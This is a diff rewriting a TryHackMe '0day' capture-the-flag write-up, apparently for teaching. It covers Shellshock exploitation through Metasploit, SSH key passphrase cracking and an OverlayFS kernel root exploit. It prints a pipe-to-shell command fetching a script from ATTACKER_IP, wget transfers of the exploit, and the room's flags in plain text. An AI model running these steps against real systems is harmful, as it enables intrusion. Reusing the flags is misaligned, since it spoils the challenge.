@@ -1,364 +1,544 @@
-# 🔥 TryHackMe - 0day
+# 🏴‍☠️ TryHackMe - 0day Writeup
 
-> Difficulty: Easy
->
-> Topics Covered:
-> - Web Enumeration
-> - Backup File Discovery
-> - SSH Key Analysis
-> - Shellshock (CVE-2014-6271)
-> - Linux Privilege Escalation
-> - Kernel Exploitation
+<p align="center">
 
----
+![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge)
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
+![Category](https://img.shields.io/badge/Category-Web_Exploitation-blue?style=for-the-badge)
+![Shellshock](https://img.shields.io/badge/Vulnerability-Shellshock-important?style=for-the-badge)
+![Privilege Escalation](https://img.shields.io/badge/Privilege_Escalation-OverlayFS-success?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-brightgreen?style=for-the-badge)
 
-# 🎯 TL;DR
-
-| Stage | Result |
-|---------|---------|
-| Recon | Found `/backup` and `/cgi-bin` |
-| Rabbit Hole | Encrypted SSH key |
-| Initial Access | Shellshock RCE |
-| User Flag | `THM{Sh3llSh0ck_r0ckz}` |
-| PrivEsc | Kernel Exploit |
-| Root Flag | `THM{g00d_j0b_0day_is_Pleased}` |
+</p>
 
 ---
 
-# 🧭 Overview
+# 🏷️ Machine Information
 
-This machine initially appeared to revolve around an exposed SSH private key hidden inside a backup directory.
-
-After spending some time attempting to crack and use the key, it became clear that the real attack path was elsewhere.
-
-The breakthrough came from investigating the CGI directory and identifying a classic Shellshock vulnerability which ultimately provided remote code execution.
-
-From there, kernel enumeration revealed a viable privilege escalation path leading to root.
+| Field        | Value                      |
+| ------------ | -------------------------- |
+| Machine Name | 0day                       |
+| Platform     | TryHackMe                  |
+| Difficulty   | Medium                     |
+| Category     | Linux / Web Exploitation   |
+| Target IP    | 10.49.181.37               |
+| Objective    | Obtain User and Root flags |
+| Status       | Complete                   |
 
 ---
 
-# 🔍 Reconnaissance
+# 🎯 Executive Overview
+
+0day was a Linux machine that initially appeared fairly simple, exposing only SSH and HTTP services. Enumeration quickly revealed several interesting web directories, including a backup location containing an encrypted RSA private key.
+
+At first, the backup key looked like the intended route for gaining access. I spent time cracking the key passphrase and attempting SSH authentication, but that path ultimately led nowhere.
+
+After stepping back and performing deeper enumeration, I discovered a vulnerable CGI endpoint susceptible to Shellshock (CVE-2014-6271). Exploiting this vulnerability provided remote code execution as `www-data`, which allowed me to obtain the user flag.
+
+Privilege escalation was achieved through a vulnerable Linux kernel using an OverlayFS local privilege escalation exploit, resulting in full root access.
+
+## Attack Summary
+
+| Stage                   | Result                          |
+| ----------------------- | ------------------------------- |
+| Reconnaissance          | SSH and Apache discovered       |
+| Web Enumeration         | Backup directory discovered     |
+| Initial Lead            | Encrypted RSA private key found |
+| Dead End                | SSH key route unsuccessful      |
+| Vulnerability Discovery | Shellshock (CVE-2014-6271)      |
+| Initial Access          | Meterpreter shell as www-data   |
+| User Flag               | Retrieved                       |
+| Privilege Escalation    | OverlayFS exploit               |
+| Root Flag               | Retrieved                       |
+
+---
+
+# 🌐 Reconnaissance
+
+I started by identifying exposed services and gathering basic information about the target.
 
 ## Port Scan
 
-Started with RustScan:
-
 ```bash
-rustscan -a 10.49.181.37 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
+┌──(kali㉿kali)-[~/lab]
+└─$ rustscan -a 10.49.181.37 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
 ```
 
 ### Results
 
-| Port | Service | Version |
-|--------|---------|---------|
-| 22 | SSH | OpenSSH 6.6.1 |
-| 80 | HTTP | Apache 2.4.7 |
+| Port | Service | Version         | Notes                   |
+| ---- | ------- | --------------- | ----------------------- |
+| 22   | SSH     | OpenSSH 6.6.1p1 | Potential remote access |
+| 80   | HTTP    | Apache 2.4.7    | Primary attack surface  |
 
-Interesting page title:
+### Nmap Service Detection
 
-```text
-0day
+```bash
+PORT   STATE SERVICE VERSION
+
+22/tcp open  ssh
+80/tcp open  http
 ```
+
+### Observation
+
+The machine exposed only two services. Since SSH generally requires credentials, the web server became the primary target for further enumeration.
 
 ---
 
-## Directory Enumeration
+# 🔎 Enumeration Notes
 
-Using Feroxbuster:
+## Directory Discovery
+
+To identify hidden content, I performed directory brute-forcing.
 
 ```bash
-feroxbuster -u http://10.49.181.37/ \
+┌──(kali㉿kali)-[~/lab]
+└─$ feroxbuster -u http://10.49.181.37 \
 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
 -x php,txt,html
 ```
 
 ### Interesting Findings
 
+| Path        | Status | Notes                       |
+| ----------- | ------ | --------------------------- |
+| /admin      | 200    | Empty                       |
+| /uploads    | 200    | Empty                       |
+| /backup     | 200    | Interesting content         |
+| /robots.txt | 200    | Present                     |
+| /cgi-bin    | 301    | Potential CGI functionality |
+
+---
+
+## Backup Directory Discovery
+
+The most interesting discovery was:
+
 ```text
-/cgi-bin/
 /backup/
-/uploads/
-/admin/
 ```
 
----
-
-# 🚧 Rabbit Hole: The SSH Key
-
-Inside `/backup` I found an encrypted RSA private key.
-
-At first this looked like the intended path.
-
-### Crack the Passphrase
-
-```bash
-ssh2john id_rsa > hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-
-Result:
+Inside the backup directory was an encrypted RSA private key.
 
 ```text
-letmein
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+...
+-----END RSA PRIVATE KEY-----
 ```
 
-Success!
+This immediately looked promising.
 
-...or so I thought.
+My assumption was that the key could provide SSH access if I could recover the passphrase.
 
 ---
 
-## ❌ What Failed
+# ❌ What Didn't Work
 
-Tried:
+One of the most valuable parts of this machine was learning which paths were misleading.
 
-```bash
-ssh 0day@TARGET -i id_rsa
-```
-
-and
-
-```bash
-ssh ryan@TARGET -i id_rsa
-```
-
-Neither worked.
-
-Despite recovering the passphrase, authentication still failed.
-
-### Lesson
-
-Not every credential you discover is useful.
-
-Sometimes it's:
-
-- Old
-- Misconfigured
-- Deliberate bait
+| Attempt                          | Why It Looked Promising               | Why It Failed                   | Lesson                                       |
+| -------------------------------- | ------------------------------------- | ------------------------------- | -------------------------------------------- |
+| Using the RSA key directly       | Private keys often lead to SSH access | Passphrase required             | Keys may be encrypted                        |
+| Guessing user `0day`             | Homepage referenced 0day              | Authentication failed           | Don't rely on assumptions                    |
+| Using user `ryan` with key       | Only discovered user account          | Authentication failed           | Correct user doesn't guarantee access        |
+| Treating cracked key as foothold | Passphrase successfully recovered     | SSH authentication still failed | Cracked credentials aren't always sufficient |
+| Running exploit source directly  | Downloaded exploit code               | Forgot to compile first         | Always verify file type before execution     |
 
 ---
 
 # 💡 Breakthrough Moment
 
-Nikto revealed something much more interesting:
+> [!IMPORTANT]
+> The RSA key appeared to be the intended attack path, but after multiple failed SSH attempts I decided to reassess the machine. Running Nikto revealed additional information about the web server and led me back toward the CGI functionality. That shift in thinking ultimately uncovered the real vulnerability: Shellshock.
+
+---
+
+# ⚔️ Initial Access
+
+## Investigating the RSA Key
+
+### What was done?
+
+The encrypted private key was converted into a format suitable for John the Ripper.
 
 ```bash
-nikto -h TARGET
+┌──(kali㉿kali)-[~/lab]
+└─$ ssh2john id_rsa > hash.txt
 ```
 
-Finding:
+Then cracked using RockYou.
+
+```bash
+┌──(kali㉿kali)-[~/lab]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+### Result
+
+```text
+id_rsa:letmein
+```
+
+### What happened?
+
+Although the passphrase was recovered successfully, authentication attempts still failed.
+
+This was a dead end.
+
+---
+
+## Vulnerability Assessment
+
+To identify alternative attack vectors, I scanned the web application using Nikto.
+
+```bash
+┌──(kali㉿kali)-[~/lab]
+└─$ nikto -h 10.49.181.37 -C all
+```
+
+Nikto revealed a potentially interesting CGI attack surface.
+
+The presence of:
 
 ```text
 /cgi-bin/
 ```
 
-Immediately suspicious.
-
-Older CGI applications often lead to:
-
-- Shellshock
-- Command Injection
-- Legacy CGI vulnerabilities
-
-This completely changed the attack path.
+combined with the server age made Shellshock worth investigating.
 
 ---
 
-# 💥 Initial Access - Shellshock
+## Exploiting Shellshock
 
-### Why Shellshock Matters
+### Why?
 
-Shellshock (CVE-2014-6271) is a Bash vulnerability allowing attackers to execute commands through specially crafted environment variables.
+Shellshock (CVE-2014-6271) affects vulnerable Bash implementations and can allow remote command execution through CGI scripts.
 
-If a CGI script passes user-controlled data into Bash:
+The machine contained:
 
-💀 Remote Code Execution.
+```text
+/cgi-bin/test.cgi
+```
+
+which appeared ideal for testing.
 
 ---
 
-## Exploitation
-
-Metasploit made quick work of it.
+### Metasploit Configuration
 
 ```bash
+msfconsole
+```
+
+```text
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
-
-set RHOSTS 10.49.181.37
-set TARGETURI /cgi-bin/test.cgi
-set LHOST YOUR_IP
-
-exploit
 ```
 
-### Shell Obtained
+Configuration:
+
+```text
+RHOSTS = 10.49.181.37
+TARGETURI = /cgi-bin/test.cgi
+LHOST = attacker
+```
+
+---
+
+### Exploitation
 
 ```bash
-uid=33(www-data)
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
 ```
 
-Shell upgraded:
+### Result
+
+```text
+Meterpreter session opened
+```
+
+After upgrading the shell:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
----
-
-# 🚩 User Flag
-
-Discovered:
+I confirmed access:
 
 ```bash
-/home/ryan/user.txt
+uid=33(www-data)
 ```
 
-Flag:
+---
+
+## User Flag
+
+Exploring the filesystem revealed a user account.
+
+```bash
+www-data@ubuntu:/home/ryan$ ls
+user.txt
+```
+
+```bash
+www-data@ubuntu:/home/ryan$ cat user.txt
+```
 
 ```text
 THM{Sh3llSh0ck_r0ckz}
 ```
 
----
-
-# 🔺 Privilege Escalation
-
-Time to become root.
+✅ User flag obtained.
 
 ---
 
-## LinPEAS Enumeration
+# 🔼 Privilege Escalation
+
+## Enumerating the Host
+
+I uploaded and executed LinPEAS.
 
 ```bash
-curl http://ATTACKER_IP/linpeas.sh | sh
+www-data@ubuntu:/tmp$ curl http://ATTACKER_IP/linpeas.sh | sh
 ```
 
-Among many findings:
+The results revealed multiple kernel vulnerabilities.
+
+Among them:
 
 ```text
-CVE-2015-3290
-espfix64_NMI
+CVE-2015-1328
+OverlayFS
 ```
 
-Looked promising.
+Several vulnerabilities were listed, but OverlayFS appeared to be one of the most practical options.
 
 ---
 
-# 🤦 Beginner Mistake
+## Downloading the Exploit
 
-Downloaded exploit:
+The exploit used was:
 
-```bash
-wget http://ATTACKER_IP/37292.c
+```text
+Exploit-DB 37292
 ```
 
-Then attempted:
+Downloaded from:
+
+```text
+https://www.exploit-db.com/download/37292
+```
+
+Transferred to the target:
+
+```bash
+wget http://ATTACKER_IP/Downloads/37292.c
+```
+
+---
+
+## Initial Mistake
+
+I initially attempted to execute the source file directly.
 
 ```bash
 ./37292.c
 ```
 
-Which obviously failed.
+This obviously failed because the file needed compilation.
 
-A `.c` file is source code.
+### Lesson
 
-It must be compiled first.
+Always verify whether a downloaded exploit is source code or a binary.
 
 ---
 
-# ✅ Actual Exploitation
-
-Compile:
+## Compiling the Exploit
 
 ```bash
 gcc 37292.c -o 37292
 ```
 
-Run:
+Running the compiled binary:
 
 ```bash
 ./37292
 ```
 
-Result:
+Output:
 
-```bash
-uid=0(root)
+```text
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
 ```
-
-Root shell obtained.
 
 ---
 
-# 👑 Root Flag
+## Root Access
+
+Immediately after execution:
 
 ```bash
-cat /root/root.txt
+# id
+```
+
+```text
+uid=0(root) gid=0(root)
+```
+
+Root access was achieved successfully.
+
+---
+
+## Root Flag
+
+```bash
+# cat /root/root.txt
 ```
 
 ```text
 THM{g00d_j0b_0day_is_Pleased}
 ```
 
----
-
-# 🧠 Key Takeaways
-
-### Enumeration Beats Assumptions
-
-I spent time attacking the SSH key because it looked important.
-
-The real attack path was hidden elsewhere.
+✅ Root flag obtained.
 
 ---
 
-### Always Investigate CGI
+# 📊 Attack Path Visualization
 
-Finding:
+```mermaid
+flowchart LR
 
-```text
-/cgi-bin/
+A[Port Scan]
+--> B[Web Enumeration]
+
+B
+--> C[/backup RSA Key]
+
+C
+--> D[Crack Key Passphrase]
+
+D
+--> E[Failed SSH Access]
+
+E
+--> F[Nikto Enumeration]
+
+F
+--> G[CGI Discovery]
+
+G
+--> H[Shellshock Exploit]
+
+H
+--> I[www-data Shell]
+
+I
+--> J[User Flag]
+
+J
+--> K[LinPEAS]
+
+K
+--> L[OverlayFS CVE-2015-1328]
+
+L
+--> M[Root Shell]
+
+M
+--> N[Root Flag]
 ```
 
-should immediately trigger further investigation.
+---
 
-Especially on older Apache servers.
+# 🧠 Key Learnings
+
+## What I Learned
+
+* Enumeration should continue even when a promising lead appears.
+* Backup files frequently expose sensitive information.
+* Cracked credentials are not always useful.
+* CGI endpoints remain dangerous when legacy vulnerabilities exist.
+* Kernel exploits should only be attempted after proper enumeration.
 
 ---
 
-### Shellshock Still Matters
+## Important Concepts
 
-Although old, Shellshock remains one of the most devastating web vulnerabilities ever discovered.
+### Shellshock
 
-Category:
+Shellshock is a Bash vulnerability that allows attackers to execute commands through crafted environment variables.
 
-- OWASP Injection
-- Remote Code Execution
+Affected CGI scripts can execute arbitrary commands remotely.
 
 ---
 
-### Learn From Mistakes
+### OverlayFS Privilege Escalation
 
-Trying to execute a `.c` file directly is a classic beginner error.
+OverlayFS is a Linux filesystem feature.
 
-Remember:
+A vulnerable implementation allowed local users to manipulate filesystem behavior and gain elevated privileges.
 
-```bash
-gcc exploit.c -o exploit
-./exploit
-```
+---
+
+### Enumeration Methodology
+
+This machine reinforced a useful principle:
+
+> Enumeration is rarely finished after the first interesting finding.
+
+The encrypted SSH key looked like the solution, but the actual compromise path came from continued investigation.
+
+---
+
+## Real-World Relevance
+
+| Concept              | Security Category                 |
+| -------------------- | --------------------------------- |
+| Shellshock           | OWASP A06 – Vulnerable Components |
+| Backup Exposure      | Sensitive Data Exposure           |
+| Weak Key Management  | Credential Security               |
+| Kernel LPE           | Linux Hardening                   |
+| CGI Misconfiguration | Legacy Web Application Risk       |
+
+---
+
+# 📚 References
+
+* HackTricks – Shellshock
+* HackTricks – Linux Privilege Escalation
+* GTFOBins
+* Exploit-DB 37292
+* CVE-2014-6271
+* CVE-2015-1328
+* OWASP Top 10
 
 ---
 
 # 🏁 Conclusion
 
-This room was a great reminder that penetration testing is often about avoiding tunnel vision.
+0day was an excellent example of how a machine can intentionally present misleading attack paths while rewarding thorough enumeration.
 
-The SSH key looked like the answer.
+The encrypted RSA key initially appeared to be the intended route into the system. After spending time cracking the passphrase and testing SSH authentication, it became clear that another path needed to be explored.
 
-It wasn't.
+Further enumeration uncovered a vulnerable CGI endpoint susceptible to Shellshock, which provided initial access as `www-data`. From there, kernel enumeration identified a vulnerable OverlayFS implementation, leading to full root compromise.
 
-The real path involved:
+The biggest takeaway from this room was the importance of persistence and methodology. A promising lead should never stop further enumeration, because the real vulnerability may be hiding elsewhere.
 
-`Enumeration ➜ CGI Discovery ➜ Shellshock ➜ www-data ➜ Kernel Exploit ➜ Root`
+**Flags Obtained**
 
-A fun machine that teaches both web exploitation and Linux privilege escalation fundamentals.
+| Flag | Status |
+| ---- | ------ |
+| User | ✅      |
+| Root | ✅      |
+
+**Machine Compromised Successfully**
+
+```
+Root Access Achieved
+```
